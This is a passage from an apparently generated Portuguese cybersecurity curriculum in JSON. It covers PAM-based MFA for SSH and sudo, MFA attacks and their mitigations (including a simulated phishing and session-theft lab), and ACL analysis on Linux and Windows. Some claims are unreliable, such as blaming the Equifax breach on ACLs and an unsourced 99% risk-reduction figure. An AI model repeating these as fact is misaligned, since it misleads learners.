                                    "Atualize o sistema com 'sudo apt update && sudo apt upgrade' (para Debian/Ubuntu) ou equivalente para Red Hat.",
                                    "Instale o pacote libpam-google-authenticator com 'sudo apt install libpam-google-authenticator' ou 'sudo yum install google-authenticator'.",
                                    "Execute 'google-authenticator' como usuário root ou o usuário alvo para gerar a chave secreta TOTP e QR code.",
                                    "Salve o arquivo de configuração em ~/.google_authenticator e ajuste permissões com 'chmod 400 ~/.google_authenticator'.",
                                    "Teste o app Authenticator no celular escaneando o QR code e verificando um código gerado."
                                  ],
                                  "verification": "Verifique se o arquivo ~/.google_authenticator existe e contém TIME, TOTP e RATE_LIMIT configurados corretamente.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Acesso root ao servidor Linux/Unix",
                                    "App Google Authenticator no smartphone",
                                    "Conexão à internet"
                                  ],
                                  "tips": "Use 'update-gecos no' durante a configuração para evitar alterações no GECOS do usuário.",
                                  "learningObjective": "Entender o processo de geração de chaves TOTP e configuração inicial do módulo PAM.",
                                  "commonMistakes": [
                                    "Não definir RATE_LIMIT, permitindo brute-force",
                                    "Permissões incorretas no arquivo de config",
                                    "Escolher 'no' para 'Does the TOTP secret need to be time-based?'"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar PAM para Autenticação SSH",
                                  "subSteps": [
                                    "Edite /etc/pam.d/sshd adicionando '@include common-auth' no topo se necessário, e inclua 'auth required pam_google_authenticator.so' após autenticação básica.",
                                    "Exemplo de linha: 'auth required pam_google_authenticator.so nullok' para permitir usuários sem MFA opcionalmente.",
                                    "Edite /etc/ssh/sshd_config e defina 'ChallengeResponseAuthentication yes' e 'PasswordAuthentication yes' (ou use publickey com MFA).",
                                    "Reinicie o SSH com 'sudo systemctl restart sshd' e verifique status com 'sudo systemctl status sshd'.",
                                    "Teste conexão SSH de outro terminal com 'ssh user@host' e insira código MFA quando solicitado."
                                  ],
                                  "verification": "Logs em /var/log/auth.log mostram 'pam_google_authenticator: accepted google_authenticator' em tentativas bem-sucedidas.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Editor de texto como nano/vim",
                                    "Acesso SSH existente",
                                    "Arquivo /etc/pam.d/sshd e /etc/ssh/sshd_config"
                                  ],
                                  "tips": "Faça backup dos arquivos PAM antes de editar: 'sudo cp /etc/pam.d/sshd /etc/pam.d/sshd.bak'.",
                                  "learningObjective": "Dominar a integração do módulo PAM com o serviço SSH para MFA.",
                                  "commonMistakes": [
                                    "Ordem incorreta das linhas PAM causando loop de autenticação",
                                    "Esquecer de reiniciar sshd",
                                    "ChallengeResponseAuthentication desabilitado"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar PAM para Sudo com MFA",
                                  "subSteps": [
                                    "Edite /etc/pam.d/sudo adicionando 'auth required pam_google_authenticator.so' após a autenticação de senha.",
                                    "Exemplo: Insira logo após 'auth required pam_unix.so' para exigir MFA em comandos sudo.",
                                    "Ajuste /etc/sudoers se necessário para regras específicas, mas teste com 'sudo ls'.",
                                    "Reinicie a sessão ou saia/reentre para aplicar mudanças.",
                                    "Execute 'sudo whoami' e forneça código MFA para validar."
                                  ],
                                  "verification": "Comando sudo falha sem código MFA, mas succeeds com código válido; cheque logs em /var/log/auth.log.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Editor de texto",
                                    "Acesso shell com sudo",
                                    "Arquivo /etc/pam.d/sudo"
                                  ],
                                  "tips": "Use 'nullok' inicialmente para testes, removendo depois para obrigatoriedade.",
                                  "learningObjective": "Implementar MFA em privilégios elevados via sudo usando PAM.",
                                  "commonMistakes": [
                                    "Colocar MFA antes da senha, bloqueando sudo",
                                    "Não testar em sessão nova",
                                    "Conflitos com outros módulos PAM"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar, Verificar Logs e Realizar Troubleshooting",
                                  "subSteps": [
                                    "Teste SSH e sudo com código MFA correto e incorreto, observando prompts e falhas.",
                                    "Monitore logs com 'tail -f /var/log/auth.log' durante testes.",
                                    "Simule falhas: código expirado, múltiplas tentativas falhas para verificar rate-limiting.",
                                    "Para Duo alternativo: Instale pam_duo, edite /etc/duo.conf e adicione 'auth required pam_duo.so' nos arquivos PAM.",
                                    "Documente configuração e crie script de backup/restore."
                                  ],
                                  "verification": "Todos os acessos SSH/sudo requerem MFA válida; rate-limiting ativa após 3 falhas; logs limpos sem erros PAM.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Comandos tail/journalctl",
                                    "App Authenticator",
                                    "Documentação PAM"
                                  ],
                                  "tips": "Use 'google-authenticator --time-based --disallow-reuse --force' para re-gerar se necessário.",
                                  "learningObjective": "Validar implementação completa e identificar problemas comuns em MFA.",
                                  "commonMistakes": [
                                    "Ignorar timezone no app (use NTP sync)",
                                    "Logs não monitorados revelando vazamentos",
                                    "Não testar failover sem MFA"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um servidor web de e-commerce Linux Ubuntu, configure MFA para o usuário admin acessando via SSH para atualizações e usando sudo para restarts de serviços, prevenindo acessos não autorizados após vazamento de senha.",
                              "finalVerifications": [
                                "Login SSH requer código TOTP além da senha.",
                                "Sudo exige MFA em cada elevação de privilégio.",
                                "Rate-limiting bloqueia após 3 tentativas falhas consecutivas.",
                                "Logs /var/log/auth.log registram sucessos/falhas corretamente.",
                                "Configuração persiste após reboot do sistema.",
                                "Usuários sem ~/.google_authenticator ainda acessam sem MFA (se nullok usado)."
                              ],
                              "assessmentCriteria": [
                                "Arquivos PAM editados corretamente sem sintaxe inválida.",
                                "Testes SSH e sudo passam com MFA válida e falham sem.",
                                "Tempo de setup dentro de 1.5 horas totais.",
                                "Logs mostram autenticações seguras sem warnings.",
                                "Backup dos arquivos originais criados.",
                                "Explicação clara de cada mudança PAM."
                              ],
                              "crossCurricularConnections": [
                                "Criptografia: Entender TOTP/HOTP e chaves secretas.",
                                "Administração de Sistemas: Gerenciamento PAM e serviços Linux.",
                                "Redes: Segurança em protocolos SSH e acessos remotos.",
                                "Compliance: Alinhamento com NIST SC-07 e CIS benchmarks.",
                                "Programação: Scripts para automação de configuração MFA."
                              ],
                              "realWorldApplication": "Em ambientes empresariais como data centers AWS/EC2 ou servidores on-premise, MFA em Linux previne breaches como o de 2020 na SolarWinds, exigindo segundo fator para admins, reduzindo risco de credenciais roubadas em 99%."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.2.2.1",
                              "10.1.6.2.2.2"
                            ]
                          },
                          {
                            "id": "10.1.6.2.3.3",
                            "name": "Identificar ataques comuns contra MFA e mitigações",
                            "description": "Analisar ataques como phishing de OTP, roubo de sessão ou bypass biométrico, propondo defesas como rate limiting e backup codes, baseado em DU (2019).",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Fundamentos de MFA e Componentes Vulneráveis",
                                  "subSteps": [
                                    "Defina MFA e seus três principais fatores: conhecimento (senha), posse (token/OTP) e inerentemente (biométrico).",
                                    "Identifique componentes comuns: apps autenticadores (Google Authenticator), SMS OTP, hardware keys (YubiKey).",
                                    "Revise fluxos de autenticação MFA típicos em SOs como Windows e Linux.",
                                    "Estude o documento DU (2019) para contexto de segurança em autenticação.",
                                    "Mapeie pontos de entrada para ataques em cada fator."
                                  ],
                                  "verification": "Crie um diagrama de fluxo MFA anotado com pelo menos 5 componentes vulneráveis.",
                                  "estimatedTime": "1.5 hours",
                                  "materials": [
                                    "Documento DU (2019)",
                                    "Diagramas de MFA do NIST SP 800-63B",
                                    "Ferramentas de diagramação como Draw.io"
                                  ],
                                  "tips": "Use analogias cotidianas, como comparar OTP a um cadeado extra na porta.",
                                  "learningObjective": "Entender a arquitetura MFA para identificar vetores de ataque iniciais.",
                                  "commonMistakes": [
                                    "Confundir MFA com 2FA simples",
                                    "Ignorar fatores híbridos",
                                    "Subestimar ataques man-in-the-middle"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar e Analisar Ataques Comuns contra MFA",
                                  "subSteps": [
                                    "Pesquise phishing de OTP: como atacantes capturam códigos via sites falsos ou vishing.",
                                    "Analise roubo de sessão: uso de cookies roubados pós-MFA para manter acesso sem reautenticação.",
                                    "Estude bypass biométrico: spoofing de fingerprints ou faces com máscaras/gel.",
                                    "Colete exemplos reais de breaches (ex: MGM Resorts 2023 phishing MFA).",
                                    "Classifique ataques por fator afetado e probabilidade."
                                  ],
                                  "verification": "Liste 5 ataques com descrições, vetores e exemplos reais em uma tabela.",
                                  "estimatedTime": "2 hours",
                                  "materials": [
                                    "Relatórios OWASP MFA",
                                    "Vídeos de demos de ataques no YouTube (ex: Hak5)",
                                    "Artigo DU (2019) seção de ameaças"
                                  ],
                                  "tips": "Simule mentalmente o fluxo do atacante para melhor retenção.",
                                  "learningObjective": "Reconhecer padrões de ataques específicos contra MFA.",
                                  "commonMistakes": [
                                    "Focar só em phishing, ignorar session hijacking",
                                    "Não diferenciar ataques ativos vs passivos",
                                    "Confundir bypass com brute force"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Mitigações e Defesas Recomendadas",
                                  "subSteps": [
                                    "Para phishing OTP: implemente rate limiting, push notifications e app-based authenticators.",
                                    "Para roubo de sessão: use tokens de curta duração, device binding e verificação de IP/geolocalização.",
                                    "Para bypass biométrico: multi-biometria, liveness detection e fallback para outros fatores.",
                                    "Revise backup codes e recovery options seguras do DU (2019).",
                                    "Compare mitigações em frameworks como NIST e CIS Controls."
                                  ],
                                  "verification": "Crie um mapa de mitigações pareado com cada ataque identificado no Step 2.",
                                  "estimatedTime": "2 hours",
                                  "materials": [
                                    "NIST SP 800-63B Digital Identity Guidelines",
                                    "Guia CIS MFA",
                                    "Ferramentas como Authy ou Duo para estudo"
                                  ],
                                  "tips": "Priorize defesas em camadas (defense-in-depth) para cobertura ampla.",
                                  "learningObjective": "Mapear defesas específicas e proporcionais a cada ameaça MFA.",
                                  "commonMistakes": [
                                    "Recomendar SMS como primário (inseguro)",
                                    "Ignorar usabilidade vs segurança",
                                    "Não considerar custo de implementação"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Sintetizar Conhecimento e Criar Plano de Defesa Personalizado",
                                  "subSteps": [
                                    "Integre ataques e mitigações em um framework de risco para um SO específico (ex: Linux PAM MFA).",
                                    "Desenvolva políticas: rollout de hardware keys, treinamento anti-phishing.",
                                    "Simule cenários: proponha respostas a um breach hipotético.",
                                    "Avalie trade-offs: segurança vs conveniência, baseado em DU (2019).",
                                    "Documente um checklist de implementação para MFA segura."
                                  ],
                                  "verification": "Produza um relatório de 1 página com plano de defesa e referências.",
                                  "estimatedTime": "1.5 hours",
                                  "materials": [
                                    "Templates de políticas de segurança (SANS Institute)",
                                    "Labs virtuais como TryHackMe MFA rooms",
                                    "DU (2019) resumo"
                                  ],
                                  "tips": "Teste o plano em um ambiente virtual para validar.",
                                  "learningObjective": "Aplicar conhecimento para propor soluções holísticas de MFA.",
                                  "commonMistakes": [
                                    "Plano genérico sem contexto SO",
                                    "Omitir monitoramento pós-implantação",
                                    "Sobrestimar uma mitigação única"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab com Kali Linux e um servidor mock MFA (usando OAuth2 com TOTP), simule phishing OTP com Gophish para capturar códigos, roubo de sessão via Burp Suite interceptando cookies, e bypass biométrico com ferramentas de spoofing; então aplique mitigações como rate limiting no servidor e binding de device, medindo eficácia com logs.",
                              "finalVerifications": [
                                "Liste e descreva 3 ataques comuns contra MFA com vetores precisos.",
                                "Proponha pelo menos 2 mitigações por ataque, justificando com referências.",
                                "Crie um diagrama de fluxo MFA seguro incorporando defesas.",
                                "Identifique limitações de biometria em cenários reais.",
                                "Explique impacto de session hijacking e como preveni-lo.",
                                "Valide um plano de defesa contra cenário hipotético de breach."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de ataques (alinhado com OWASP/NIST).",
                                "Profundidade das mitigações, incluindo trade-offs usabilidade/segurança.",
                                "Uso correto de referências como DU (2019).",
                                "Criatividade e praticidade no plano de defesa.",
                                "Clareza em diagramas e tabelas de síntese.",
                                "Cobertura completa de fatores MFA (conhecimento, posse, inerente)."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Análise de tráfego para detectar session hijacking ( Wireshark).",
                                "Criptografia: Entendimento de TOTP/HOTP e chaves assimétricas em FIDO2.",
                                "Ética e Direito: Implicações legais de phishing e conformidade GDPR.",
                                "Desenvolvimento de Software: Implementação de MFA em APIs (OAuth).",
                                "Gestão de Riscos: Modelos como STRIDE para ameaças de autenticação."
                              ],
                              "realWorldApplication": "Em empresas como bancos ou governos, profissionais usam esse conhecimento para configurar MFA em Active Directory ou SSO, prevenindo breaches como o da Okta em 2022 (session hijacking), reduzindo riscos de acesso não autorizado e garantindo conformidade com regulamentações como PCI-DSS."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.2.1.3",
                              "10.1.6.2.2.4"
                            ]
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.6.3",
                    "name": "Listas de Controle de Acesso (ACLs)",
                    "description": "Estruturas para definir permissões específicas de usuários ou grupos sobre objetos em sistemas operacionais.",
                    "individualConcepts": [
                      {
                        "id": "10.1.6.3.1",
                        "name": "Componentes Básicos das ACLs",
                        "description": "Elementos fundamentais que compõem uma Lista de Controle de Acesso, incluindo subjects (usuários ou grupos), objects (arquivos, diretórios ou recursos) e entradas de permissão.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.3.1.1",
                            "name": "Identificar subjects e objects em ACLs",
                            "description": "Reconhecer e diferenciar subjects (identificadores de usuários ou grupos) de objects (recursos do SO como arquivos ou processos) em estruturas de ACL, com exemplos em sistemas como Linux e Windows.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Conceitos Fundamentais de Subjects e Objects em ACLs",
                                  "subSteps": [
                                    "Defina 'subject' como qualquer entidade que solicita acesso, como usuários individuais, grupos ou contas de serviço.",
                                    "Defina 'object' como o recurso protegido pelo SO, incluindo arquivos, diretórios, processos, registradores ou portas de rede.",
                                    "Compare subjects e objects usando diagramas simples: subject → ação → object.",
                                    "Estude a hierarquia: subjects podem ser mapeados via SID (Windows) ou UID/GID (Linux).",
                                    "Revise exemplos genéricos: 'user:alice' (subject) acessando '/etc/passwd' (object)."
                                  ],
                                  "verification": "Crie um diagrama manual distinguindo 3 subjects e 3 objects comuns; verifique se não há confusão entre eles.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação oficial de ACLs (man pages Linux, MS Docs Windows)",
                                    "Papel e caneta para diagramas",
                                    "Notebook para anotações"
                                  ],
                                  "tips": "Use mnemônicos: 'Subject = Quem pede', 'Object = O que é pedido'.",
                                  "learningObjective": "Diferenciar conceitualmente subjects de objects em qualquer contexto de ACL.",
                                  "commonMistakes": [
                                    "Confundir subjects com ações (ex: 'read' não é subject)",
                                    "Ignorar grupos como subjects",
                                    "Pensar que processos são sempre subjects"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar ACLs em Linux (setfacl/getfacl)",
                                  "subSteps": [
                                    "Instale e use comandos: `getfacl /etc/passwd` para visualizar ACLs.",
                                    "Identifique subjects: u:: (owner), g:: (group), u:username, g:groupname, m:: (mask).",
                                    "Identifique objects: o caminho do arquivo/diretório exibido no cabeçalho do getfacl.",
                                    "Modifique com setfacl: `setfacl -m u:alice:r /etc/passwd` e reexamine.",
                                    "Pratique em 3 arquivos diferentes, anotando subjects e objects."
                                  ],
                                  "verification": "Execute getfacl em 5 arquivos e liste corretamente todos subjects e objects sem erros.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Máquina Linux (VM Ubuntu)",
                                    "Comandos: getfacl, setfacl",
                                    "Editor de texto como nano"
                                  ],
                                  "tips": "Sempre rode como root ou sudo para permissões completas; foque no cabeçalho para objects.",
                                  "learningObjective": "Reconhecer subjects e objects em saídas reais de ACLs Linux.",
                                  "commonMistakes": [
                                    "Confundir 'mask' com subject",
                                    "Ignorar o object no topo da saída",
                                    "Não diferenciar u: de g:"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar ACLs em Windows (icacls/cacls)",
                                  "subSteps": [
                                    "Use icacls: `icacls C:\\Windows\\System32\\drivers\\etc\\hosts` para listar.",
                                    "Identifique subjects: BUILTIN\\Administrators, NT AUTHORITY\\SYSTEM, DOMAIN\\user.",
                                    "Identifique objects: o caminho completo do arquivo no comando.",
                                    "Compare com GUI: Propriedades > Segurança > Avançado.",
                                    "Aplique mudanças: `icacls file.txt /grant DOMAIN\\alice:R` e reverifique."
                                  ],
                                  "verification": "Analise icacls de 5 arquivos Windows e rotule subjects/objects com 100% acurácia.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Máquina Windows (VM Win10)",
                                    "Prompt de comando elevado",
                                    "Documentação MS icacls"
                                  ],
                                  "tips": "SID vs. nomes: aprenda a mapear S-1-5-... para contas reais com `wmic useraccount`.",
                                  "learningObjective": "Identificar subjects e objects em sintaxe Windows ACL.",
                                  "commonMistakes": [
                                    "Misturar subjects com permissões (ex: '(F)' é permissão, não subject)",
                                    "Confundir object com subdiretórios",
                                    "Ignorar 'BUILTIN' como prefixo de subject"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar Identificação Comparativa e Cenários Mistos",
                                  "subSteps": [
                                    "Crie uma tabela comparativa: colunas para Linux/Windows, linhas para subjects/objects exemplos.",
                                    "Resolva 10 exercícios mistos: forneça saídas truncadas de getfacl/icacls e identifique.",
                                    "Simule cenários: 'Qual subject acessa object em log de auditoria?'.",
                                    "Teste com ACLs avançadas: herança em diretórios (Windows) ou máscaras POSIX (Linux).",
                                    "Autoavalie com quiz: 20 questões de identificação rápida."
                                  ],
                                  "verification": "Complete quiz com ≥95% acerto e explique 3 erros em um relatório.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Planilha Excel/Google Sheets para tabela",
                                    "Exercícios impressos ou digitais",
                                    "Quiz online (Kahoot ou similar)"
                                  ],
                                  "tips": "Cronometre identificação: mire <10s por exemplo para fluência.",
                                  "learningObjective": "Aplicar identificação de subjects/objects cross-plataforma em cenários reais.",
                                  "commonMistakes": [
                                    "Não notar diferenças de sintaxe entre OS",
                                    "Sobrecarregar com herança prematuramente",
                                    "Confundir em logs auditados"
                                  ]
                                }
                              ],
                              "practicalExample": "Em Linux: `getfacl /home/user/docs/secret.txt` mostra 'user::rw-, group::r--, other::---, user:alice:r--' onde subjects são 'user::', 'group::', 'other::', 'user:alice' e object é '/home/user/docs/secret.txt'. Em Windows: `icacls C:\\secret.txt` mostra 'BUILTIN\\Users:(R)' onde subject é 'BUILTIN\\Users' e object é 'C:\\secret.txt'. Identifique e justifique acesso negado para 'bob'.",
                              "finalVerifications": [
                                "Lista corretamente 5 subjects e 5 objects comuns em Linux sem hesitação.",
                                "Explica diferenças de sintaxe ACL entre Linux e Windows.",
                                "Analisa uma saída real de getfacl/icacls e aponta todos subjects/objects.",
                                "Diferencia subjects hierárquicos (grupos vs. usuários).",
                                "Identifica em cenários de auditoria: 'quem acessou o quê'.",
                                "Cria exemplo próprio de ACL com subjects/objects claros."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação: ≥95% em 20 exemplos mistos.",
                                "Velocidade de análise: <15s por ACL simples.",
                                "Explicação conceitual: cobre definições, exemplos e diferenças OS.",
                                "Aplicação prática: modifica ACLs corretamente sem quebrar acesso.",
                                "Compreensão avançada: lida com herança e máscaras.",
                                "Autoavaliação: identifica e corrige próprios erros."
                              ],
                              "crossCurricularConnections": [
                                "Autenticação e Autorização (IA-02): subjects ligam a identidades autenticadas.",
                                "Auditoria de Segurança (AU-02): logs registram subject-object interações.",
                                "Gestão de Configurações (CM-02): ACLs controlam baselines de segurança.",
                                "Redes e Firewalls: subjects/objects em ACLs de rede (iptables NTFS).",
                                "Programação: scripts para parse de ACLs em Python/PowerShell."
                              ],
                              "realWorldApplication": "Em administração de sistemas, identificar subjects/objects em ACLs permite auditar acessos indevidos a arquivos sensíveis (ex: detectar usuário não autorizado em /etc/shadow no Linux ou registry no Windows), configurar least privilege em ambientes corporativos e investigar incidentes de segurança como vazamentos de dados."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.3.1.2",
                            "name": "Analisar entradas de ACL",
                            "description": "Interpretar entradas individuais em uma ACL, compreendendo formato como (subject, object, permissions) e como elas definem acesso granular.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender o Formato Geral de Entradas ACL",
                                  "subSteps": [
                                    "Pesquise definições de ACL em contextos de sistemas operacionais como Linux (setfacl/getfacl) ou Windows NTFS.",
                                    "Identifique o formato padrão: tipicamente (subject, object, permissions), onde subject é usuário/grupo, object é recurso, permissions são ações permitidas/negadas.",
                                    "Compare formatos em diferentes SOs, notando variações como ACLs POSIX vs. NTFS.",
                                    "Anote exemplos sintáticos, como 'user:alice:rwx file.txt'.",
                                    "Registre diferenças entre ACLs discretas (por entrada) e cumulativas."
                                  ],
                                  "verification": "Crie um diagrama resumindo o formato geral e compare com documentação oficial.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação Linux man pages (setfacl, getfacl)",
                                    "Documentação Microsoft NTFS ACL",
                                    "Bloco de notas ou ferramenta de diagramação como Draw.io"
                                  ],
                                  "tips": "Comece com exemplos simples para evitar sobrecarga; foque em padrões comuns antes de variações.",
                                  "learningObjective": "Compreender a estrutura sintática e semântica básica de entradas ACL.",
                                  "commonMistakes": [
                                    "Confundir subject com object",
                                    "Ignorar flags de herança em ACLs avançadas",
                                    "Assumir uniformidade entre SOs"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Dissecar Componentes Individuais de uma Entrada ACL",
                                  "subSteps": [
                                    "Analise o 'subject': identifique tipos (usuário, grupo, todos) e como especificá-los (UID, GID, nomes).",
                                    "Examine o 'object': entenda recursos como arquivos, diretórios, shares de rede e wildcards.",
                                    "Decodifique 'permissions': liste ações padrão (read, write, execute, delete) e representações (rwx, binário).",
                                    "Identifique qualificadores adicionais como deny/allow, herança (container/object) e propagação.",
                                    "Pratique parsing manual de 2-3 entradas de exemplo."
                                  ],
                                  "verification": "Parse uma entrada ACL fornecida e rotule cada componente corretamente em um relatório.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Exemplos de ACLs de getfacl em terminal Linux",
                                    "Ferramenta icacls no Windows",
                                    "Editor de texto para anotações"
                                  ],
                                  "tips": "Use cores para destacar componentes em exemplos visuais; memorize mnemônicos como 'SOP' para Subject-Object-Permissions.",
                                  "learningObjective": "Identificar e nomear precisamente cada componente de uma entrada ACL.",
                                  "commonMistakes": [
                                    "Interpretar permissões como absolutas sem contexto de deny/allow",
                                    "Omitir qualificadores de herança",
                                    "Confundir usuários com grupos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Interpretar o Impacto das Permissões no Acesso Granular",
                                  "subSteps": [
                                    "Avalie como permissões granulares permitem controle fino (ex: read-only para auditores).",
                                    "Simule cenários: o que acontece se múltiplas entradas se aplicam ao mesmo subject/object?",
                                    "Entenda precedência: deny sobrepõe allow, ordem de avaliação.",
                                    "Analise efeitos de herança em hierarquias de diretórios.",
                                    "Discuta implicações de segurança, como princípio do menor privilégio."
                                  ],
                                  "verification": "Preveja resultados de acesso para 3 cenários com entradas ACL sobrepostas e valide com simulação.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Simulador ACL online ou VM Linux/Windows",
                                    "Ferramentas como getfacl/setfacl",
                                    "Planilha para simular precedências"
                                  ],
                                  "tips": "Pense em termos de 'quem pode o quê onde'; teste em ambiente sandbox para validação.",
                                  "learningObjective": "Avaliar como entradas ACL definem e restringem acesso granularmente.",
                                  "commonMistakes": [
                                    "Ignorar ordem de avaliação",
                                    "Subestimar impacto de herança",
                                    "Confundir granularidade com permissões amplas"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar Análise Completa de Entradas ACL Reais",
                                  "subSteps": [
                                    "Colete entradas ACL de um sistema real ou dump (ex: getfacl -R /home).",
                                    "Analise 5 entradas: descreva subject, object, permissions e implicações.",
                                    "Identifique anomalias potenciais (ex: over-permissions, órfãos).",
                                    "Proponha otimizações ou correções baseadas na análise.",
                                    "Documente achados em um relatório estruturado."
                                  ],
                                  "verification": "Submeta relatório de análise de ACLs reais com interpretações corretas e recomendações.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Terminal Linux com ACLs ativadas (mount -o acl)",
                                    "Dump de ACLs de produção (anonimizado)",
                                    "Template de relatório"
                                  ],
                                  "tips": "Comece com ACLs simples; use diff para comparar antes/depois de análises.",
                                  "learningObjective": "Aplicar análise integrada para interpretar entradas ACL em contextos reais.",
                                  "commonMistakes": [
                                    "Não considerar contexto do sistema",
                                    "Focar só em sintaxe sem semântica",
                                    "Passar por entradas deny inadvertidas"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um servidor Linux, a entrada ACL 'user:auditor:r-- /var/log/secure' permite que o usuário 'auditor' leia o arquivo de logs de segurança (/var/log/secure), mas nega escrita/execução. Isso garante auditoria sem risco de alteração, exemplificando acesso granular para conformidade (ex: PCI-DSS). Análise: Subject=auditor (usuário), Object=/var/log/secure (arquivo), Permissions=r-- (read-only).",
                              "finalVerifications": [
                                "Pode parsear corretamente 90% das componentes em entradas ACL aleatórias.",
                                "Explica precedência de deny/allow em cenários múltiplos.",
                                "Identifica herança e propagação em hierarquias.",
                                "Propõe correções para ACLs mal configuradas.",
                                "Simula acessos corretamente em ferramenta de teste.",
                                "Documenta análises de forma clara e estruturada."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de subject, object e permissions (80%+).",
                                "Compreensão demonstrada de granularidade e precedência.",
                                "Qualidade e completude da análise prática.",
                                "Identificação correta de erros comuns e anomalias.",
                                "Clareza na documentação e exemplos.",
                                "Aplicação do princípio do menor privilégio nas recomendações."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Integração com RBAC em Active Directory.",
                                "Programação: Parsing de ACLs via APIs (ex: Python subprocess para getfacl).",
                                "Gestão de Sistemas: Automatização com Ansible para auditoria ACL.",
                                "Direito/Ética: Conformidade com regulamentações como GDPR em controles de acesso."
                              ],
                              "realWorldApplication": "Administradores de sistemas usam análise de ACLs para auditar permissões em servidores corporativos, prevenindo vazamentos de dados (ex: Equifax breach devido a ACLs mal configuradas) e garantindo conformidade em ambientes cloud como AWS S3 buckets com políticas IAM semelhantes."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.3.1.1"
                            ]
                          },
                          {
                            "id": "10.1.6.3.1.3",
                            "name": "Comparar ACLs com outros modelos de controle",
                            "description": "Diferenciar ACLs de modelos como RBAC ou MAC, destacando sua natureza discricionária (DAC) em sistemas operacionais modernos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar Fundamentos de ACLs e Controle de Acesso Discricionário (DAC)",
                                  "subSteps": [
                                    "Leia definições de ACLs como listas que definem permissões específicas por usuário ou grupo em objetos de SO.",
                                    "Identifique características do DAC: proprietário do objeto decide acessos.",
                                    "Estude exemplos em SO como Windows NTFS ou Linux POSIX ACLs.",
                                    "Anote como ACLs são flexíveis mas podem ser complexas em escala.",
                                    "Compare brevemente com controles não-discricionários."
                                  ],
                                  "verification": "Escreva um resumo de 100 palavras explicando DAC e ACLs, incluindo um exemplo de permissão.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação Microsoft NTFS ACLs",
                                    "Man page Linux getfacl/setfacl",
                                    "Artigo NIST sobre modelos de controle de acesso"
                                  ],
                                  "tips": "Use diagramas para visualizar quem controla as permissões no DAC.",
                                  "learningObjective": "Compreender a natureza discricionária das ACLs em SO modernos.",
                                  "commonMistakes": "Confundir DAC com permissões gerenciadas centralmente."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Estudar Controle Baseado em Funções (RBAC)",
                                  "subSteps": [
                                    "Defina RBAC: acessos baseados em papéis/funções atribuídos a usuários.",
                                    "Liste componentes: usuários, roles, permissões, sessões.",
                                    "Analise hierarquias de roles e separação de duties.",
                                    "Examine exemplos em sistemas como Active Directory ou Kubernetes RBAC.",
                                    "Note vantagens em ambientes enterprise: escalabilidade e auditoria."
                                  ],
                                  "verification": "Crie uma tabela simples com usuários, roles e permissões para um cenário de RH.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "NIST SP 800-53 RBAC",
                                    "Documentação Kubernetes RBAC",
                                    "Vídeo tutorial sobre RBAC no YouTube"
                                  ],
                                  "tips": "Pense em roles como 'gerente' vs permissões granulares por arquivo.",
                                  "learningObjective": "Identificar como RBAC centraliza gerenciamento via roles.",
                                  "commonMistakes": "Achar que RBAC é puramente discricionário; é baseado em políticas."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Controle de Acesso Obrigatório (MAC)",
                                  "subSteps": [
                                    "Defina MAC: políticas impostas pelo SO, não pelo usuário (ex: SELinux, AppArmor).",
                                    "Estude rótulos de segurança (confidencialidade, integridade).",
                                    "Analise regras como Bell-LaPadula (no read up) ou Biba (no write up).",
                                    "Veja implementações em SO: SELinux no Linux, Mandatory Integrity Control no Windows.",
